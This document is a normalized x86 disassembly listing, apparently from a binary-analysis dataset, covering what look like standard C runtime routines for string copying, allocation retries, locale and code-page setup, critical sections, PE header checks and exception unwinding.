cmp [ edx ] 0x0
je r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_4268f3
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx eax [ ecx ]
mov [ edx + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
call sub_42970c
mov eax esi
sub_42abc1
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_4268f3
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov edx esi
sub edx eax
mov [ esi ] ax
jmp r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_4268f3
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx ecx [ eax ]
mov [ edx + eax ] cx
add eax 0x2
test cx cx
je r-xdata
call sub_42970c
mov eax esi
sub_42ac24
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
js r-xdata
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
or eax 0xffffffff
pop ebp
retn
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
pop ebp
retn
cmp ecx 0x3
jne r-xdata
mov eax [ rw-data ]
pop ebp
retn
sub_42ac72
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call [ Sleep@IAT ]
add esi 0x3e8
cmp esi [ rw-data ]
jbe r-xdata
mov eax esi
pop esi
pop ebp
retn
or esi 0xffffffff
sub_42acad
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_424f00
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_42acf2
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_437515
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_42ad3e
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_437597
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_42ad8c
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0x10 ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_437644
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_42adde
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
or eax 0xffffffff
pop ebp
retn
sub_42ae11
mov edi edi
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x1
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0x18 ]
mov [ ebp - 0x88 ] eax
jne r-xdata
cmp [ ebp + 0xc ] 0x2
jne r-xdata
and [ ebp - 0x8c ] 0x0
push 0x80
lea ebx [ ebp - 0x84 ]
mov ecx ebx
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
call sub_437877
mov esi eax
add esp 0x14
test esi esi
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov esi [ GetLocaleInfoW@IAT ]
xor eax eax
push eax
push eax
push [ ebp + 0x14 ]
mov [ edi ] eax
push [ ebp + 0x10 ]
call esi
mov ebx eax
test ebx ebx
je r-xdata
push 0x1
push esi
call sub_42acf2
mov [ edi ] eax
xor edi edi
pop ecx
pop ecx
cmp eax edi
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
or eax 0xffffffff
and [ ebp - 0x88 ] 0x0
push 0x2
lea eax [ ebp - 0x88 ]
push eax
mov eax [ ebp + 0x14 ]
or eax 0x20000000
push eax
push [ ebp + 0x10 ]
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
push [ edi ]
call sub_42578a
and [ edi ] 0x0
pop ecx
jmp r-xdata
push 0x2
push ebx
call sub_42acf2
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
lea ecx [ esi - 0x1 ]
push ecx
push ebx
push esi
push eax
call sub_4376b2
add esp 0x10
test eax eax
jne r-xdata
cmp [ ebp - 0x8c ] edi
je r-xdata
push esi
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x88 ]
call sub_437877
add esp 0x14
mov [ ebp - 0x90 ] eax
test eax eax
je r-xdata
mov al [ ebp - 0x88 ]
mov [ edi ] al
jmp r-xdata
push ebx
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call esi
test eax eax
jne r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_4296a0
cmp [ ebp - 0x8c ] edi
je r-xdata
push ebx
call sub_42578a
pop ecx
inc esi
push esi
push eax
call sub_42acf2
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call sub_42578a
pop ecx
push [ ebp - 0x90 ]
mov [ ebp - 0x8c ] esi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x88 ]
call sub_437877
mov esi eax
add esp 0x14
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
sub_42afd4
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_42b01e
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_42578a
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_42b0a4
push 0xc
push r--data
call sub_4278c0
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_426840
push 0x1e
call sub_426691
push 0xff
call sub_42632e
push 0x18
call sub_42acad
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_42b166
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_4268f3
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_427905
retn
push edi
call sub_42578a
pop ecx
push 0xfa0
push edi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_42578a
pop ecx
call sub_4268f3
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42b15d
mov eax [ ebp - 0x1c ]
sub_42b166
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_42b0a4
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_42664d
sub_42b23d
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
mov esi eax
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
and [ eax ] 0x0
push edi
test esi esi
jne r-xdata
call sub_4268f3
push 0x16
pop esi
mov [ eax ] esi
call sub_42970c
mov eax esi
jmp r-xdata
push 0x4
push [ ebp + 0x8 ]
call esi
test eax eax
jne r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
pop esi
leave
retn
xor eax eax
call sub_4268f3
mov [ eax ] 0xc
call sub_4268f3
mov eax [ eax ]
jmp r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
jne r-xdata
call sub_4268f3
push 0x16
pop esi
mov [ eax ] esi
call sub_42970c
mov eax esi
jmp r-xdata
pop edi
push ebx
push esi
call [ EncodePointer@IAT ]
mov edi eax
call sub_426a4c
push edi
push rw-data
mov ebx eax
call [ InterlockedExchange@IAT ]
cmp eax ebx
pop ebx
je r-xdata
call sub_4268f3
mov esi [ GetLastError@IAT ]
mov edi eax
call esi
push eax
call sub_4268b1
pop ecx
mov [ edi ] eax
call sub_42970c
call esi
push eax
call sub_4268b1
pop ecx
jmp r-xdata
push [ ebp - 0x4 ]
call [ FreeLibrary@IAT ]
sub_42b32d
mov edi edi
push esi
push edi
xor edi edi
push [ edi + rw-data ]
call [ EncodePointer@IAT ]
mov [ edi + rw-data ] eax
add edi 0x4
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_42b350
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_42b390
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_42b3e0
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_427950
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_42b350
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_42b390
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b4ad
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_42b4dc
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_4338e0
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_42b540
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
lea edx [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
lea edx [ ecx - 0x20 ]
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_437bec
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_437abf
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_437abf
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
mov al [ ebx + 0x1 ]
add ebx 0x2
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_4338e0
add esp 0xc
mov [ esi + eax + 0x11d ] bl
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_42b6d0
push 0xc
push r--data
call sub_4278c0
call sub_426c39
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_42b166
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42b76b
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_427905
retn
push 0x20
call sub_42664d
cmp esi rw-data
je r-xdata
push esi
call sub_42578a
pop ecx
sub_42b774
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_426c39
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_4294bb
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_42b6d0
mov [ esi + 0x4 ] eax
sub_42b7fb
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_42b774
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_42b877
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_42b7fb
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_42b4dc
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_4338e0
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_42b4ad
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
mov [ eax ] si
add ecx 0x2
add eax 0x2
dec edx
jne r-xdata
mov esi ebx
call sub_42b540
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
add esi 0x2
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_4338e0
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_42b4ad
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
add esi 0x2
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_42ba60
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_42b774
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
mov eax [ eax + 0x4 ]
je r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
leave
retn
sub_42ba9e
push 0x14
push r--data
call sub_4278c0
or [ ebp - 0x20 ] 0xffffffff
call sub_426c39
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_42b6d0
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_42b7fb
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_42acad
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_427905
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_42b877
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_4268f3
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_42578a
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_42578a
pop ecx
push 0xd
call sub_42b166
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42bbff
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_42578a
pop ecx
sub_42bc56
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_42b774
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_42beab
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_42b774
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x3a4
jne r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x3
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_42bc56
add esp 0x10
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
leave
retn
sub_42bf20
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_42bfb0
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_437d45
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_437d64
jmp r-xdata
sub_42bfb0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_4247dc
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_42bf20
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_42c012
push ebp
push esi
push edi
push ebx
mov ebp edx
